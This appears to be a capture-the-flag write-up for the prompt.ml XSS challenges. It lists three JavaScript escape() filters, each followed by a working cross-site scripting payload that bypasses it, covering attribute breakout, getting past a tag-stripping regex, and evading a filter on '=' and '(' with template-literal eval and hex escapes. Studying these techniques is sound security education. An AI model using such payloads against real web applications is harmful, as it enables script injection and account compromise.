# prompt.ml

- Task

```js
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
} 
```

- Solution

```js
"><svg onload=prompt(1)> <!--
```

- Task

```js
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```

- Solution

```js
<svg onload=prompt(1) // 
```

- Task

```js
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}     
```

- Solution

```js
<script>eval.call`${'prompt\x281\x29'}`</script>
```
